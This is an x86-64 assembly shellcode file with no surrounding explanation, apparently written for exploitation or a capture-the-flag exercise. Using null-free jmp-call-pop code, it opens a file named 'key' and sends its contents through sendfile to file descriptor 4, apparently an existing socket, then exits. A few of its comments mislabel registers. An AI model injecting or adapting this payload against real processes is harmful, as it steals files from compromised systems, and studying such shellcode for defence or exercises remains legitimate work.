BITS 64
GLOBAL _start
_start:
    jmp short get_eip
 
run:
    xor rax, rax
    xor rdi, rdi
    xor rdx, rdx
 
    ;sys_open(char* fname, int flags, int mode)
    xor rsi,rsi     ; mode
    pop rdi         ; filename
    xor rax, rax    ; flags
    mov al, 2       ; syscall sys_open
    syscall

    ; sys_sendfile(int out_fd, int in_fd, off_t *offset, size_t count)
    mov rsi, rax    ; in_fd
    xor rax, rax
    add al, 0x28    ; sys_sendfile
    xor rdi, rdi
    dec di
    mov r10, rdi
    xor rdi, rdi   
    inc rdi
    inc rdi
    inc rdi
    inc rdi         ; out_fd
    xor rdx,rdx     ; offset
    syscall

    ; sys_exit(return_code)
    xor rax, rax
    add al, 60  ; sys_exit
    xor rdi, rdi ; return 0 (success)
    syscall
 
get_eip:
    call run
 
filename:
    db 'key', 0x0
